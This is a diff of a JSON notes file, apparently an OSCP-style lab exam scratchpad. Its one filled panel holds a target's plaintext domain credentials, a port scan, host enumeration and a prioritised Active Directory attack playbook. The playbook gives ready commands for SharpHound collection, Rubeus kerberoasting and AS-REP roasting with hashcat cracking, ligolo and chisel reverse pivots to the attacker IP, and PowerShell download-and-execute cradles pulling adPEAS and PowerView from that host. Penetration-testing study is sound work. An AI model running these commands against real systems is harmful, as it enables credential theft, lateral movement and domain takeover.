@@ -1,12 +1,12 @@
 {
   "version": 1,
-  "updatedAt": "2026-11-24T07:39:15.856Z",
+  "updatedAt": "2026-11-24T08:22:03.452Z",
   "panels": [
     {
       "id": "ad",
       "title": "AD SET MS01, MS02, DC01",
-      "text": "MS01 \nexport KALI=192.168.45.158\nexport TARGET=192.168.133.153\nexport DC=10.10.133.152\nexport DOMAIN=oscp.exam\nexport NETBIOS=OSCP\nexport USER=Eric.Wallows\nexport PASS=EricLikesRunning800",
-      "updatedAt": "2026-11-24T07:39:15.856Z",
+      "text": "MS01 \nexport KALI=192.168.45.158\nexport TARGET=192.168.133.153\nexport DC=10.10.133.152\nexport DOMAIN=oscp.exam\nexport NETBIOS=OSCP\nexport USER=Eric.Wallows\nexport PASS=EricLikesRunning800\n\nPORT      STATE SERVICE\n22/tcp    open  ssh\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n5040/tcp  open  unknown\n5985/tcp  open  wsman\n5986/tcp  open  wsmans\n7680/tcp  open  pando-pub\n8000/tcp  open  http-alt\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49668/tcp open  unknown\n49669/tcp open  unknown\n49671/tcp open  unknown\n49722/tcp open  unknown\n\n22,135,139,445,5040,5985,5986,7680,8000,47001,49664,49665,49666,49667,49668,49669,49671,49722\n\n  1. HOST\n==========================================================================\n  computer                   MS01\n  user                       OSCP\\eric.wallows\n  elevated                   no\n  os                         Windows 10 Pro  build 19044.2251\n  role                       Workstation\n  domain                     oscp.exam\n  groups                     Remote Management Users\n  privileges                 none notable\n  dotnet                     4.8 (528372)\n  powershell                 5.1.19041.1682\n  arch                       AMD64\n  av / edr                   none reported / unknown\n  local admins               Admin, Administrator, cloudbase-init\n  listening                  445/smb 5985/winrm 5986/winrm-ssl\n  subnets                    -\n  attacker                   192.168.45.158:4444  (all payloads point here)\n  folder                     C:\\Users\\eric.wallows\\AppData\\Local\\Temp\n\n  -- priority 0 (do this first)\n  [1] SharpHound   [recon]\n      why  Domain-joined: the graph decides every later step. Collect, exfil the ZIP, load it in BloodHound.\n      run  .\\SharpHound.exe -c All,LoggedOnUsers --zipfilename BH_MS01.zip\n  -- priority 1 (high)\n  [2] kerberoast   [gain]\n      why  One TGS per SPN account, cracked offline. Kali: hashcat -m 13100 kerb.txt rockyou.txt\n      run  .\\Rubeus.exe kerberoast /outfile:C:\\Users\\eric.wallows\\AppData\\Local\\Temp\\kerb.txt /nowrap /format:hashcat\n  -- priority 2 (medium)\n  [3] asreproast   [gain]\n      why  Accounts without pre-auth hand over an AS-REP you can crack; harmless no-op when none exist.\n      run  .\\Rubeus.exe asreproast /format:hashcat /outfile:C:\\Users\\eric.wallows\\AppData\\Local\\Temp\\asrep.txt\n  [4] ligolo   [gain]\n      why  Pivot: this host can reach segments you cannot (internal MS02/DC). Run the agent and route through it.\n      run  .\\agent.exe -connect 192.168.45.158:11601 -ignore-cert\n  [5] chisel   [gain]\n      why  Kali: chisel server -p 8001 --reverse (socks5 on 1080). Beats ligolo when only 443/80 egress is allowed.\n      run  .\\chisel.exe client 192.168.45.158:8001 R:socks\n  [6] winPEAS   [recon]\n      why  Baseline local privesc: services, ACLs, autologon, unattended files, scheduled tasks.\n      run  .\\winPEASx64.exe quiet cmd fast\n  [7] adPEAS   [recon]\n      why  Fills gaps SharpHound leaves: ADCS templates, GPO rights, delegation, unquoted service paths.\n      run  IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.158:8888/adPEAS.ps1'); Invoke-adPEAS\n  [8] ADCS   [recon]\n      why  A vulnerable template mints a certificate for any account you name - ESC1/ESC8 is usually the shortest path to DA.\n      run  .\\Certify.exe find /vulnerable\n  -- priority 3 (triage)\n  [9] SharpUp   [recon]\n      why  Fast check for unquoted service paths, writable service binaries, weak service ACLs.\n      run  .\\SharpUp.exe audit\n  [10] Seatbelt   [recon]\n      why  Host triage: autologon, LAPS, AV, shares, PuTTY keys, browser data, recent files.\n      run  .\\Seatbelt.exe -group=all -full\n  -- priority 4 (if time)\n  [11] PowerView   [recon]\n      why  Ad-hoc LDAP questions the graph did not answer.\n      run  IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.158:8888/PowerView.ps1'); Get-DomainUser -SPN | select samaccountname,serviceprincipalname\n",
+      "updatedAt": "2026-11-24T08:22:03.452Z",
       "custom": false,
       "pending": false
     },
@@ -14,7 +14,7 @@
       "id": "linux1",
       "title": "Linux 1",
       "text": "",
-      "updatedAt": "2026-11-24T00:01:58.411Z",
+      "updatedAt": "2026-11-24T08:22:03.452Z",
       "custom": false,
       "pending": false
     },
@@ -22,7 +22,7 @@
       "id": "linux2",
       "title": "Linux 2",
       "text": "",
-      "updatedAt": "2026-11-24T00:01:58.411Z",
+      "updatedAt": "2026-11-24T08:22:03.452Z",
       "custom": false,
       "pending": false
     },
@@ -30,7 +30,7 @@
       "id": "win1",
       "title": "Windows 1",
       "text": "",
-      "updatedAt": "2026-11-24T00:01:58.411Z",
+      "updatedAt": "2026-11-24T08:22:03.452Z",
       "custom": false,
       "pending": false
     },
@@ -38,7 +38,7 @@
       "id": "extra1",
       "title": "Additional 1",
       "text": "",
-      "updatedAt": "2026-11-24T00:01:58.411Z",
+      "updatedAt": "2026-11-24T08:22:03.452Z",
       "custom": true,
       "pending": false
     },
@@ -46,7 +46,7 @@
       "id": "extra2",
       "title": "Additional 2",
       "text": "",
-      "updatedAt": "2026-11-24T00:01:58.411Z",
+      "updatedAt": "2026-11-24T08:22:03.452Z",
       "custom": true,
       "pending": false
     }
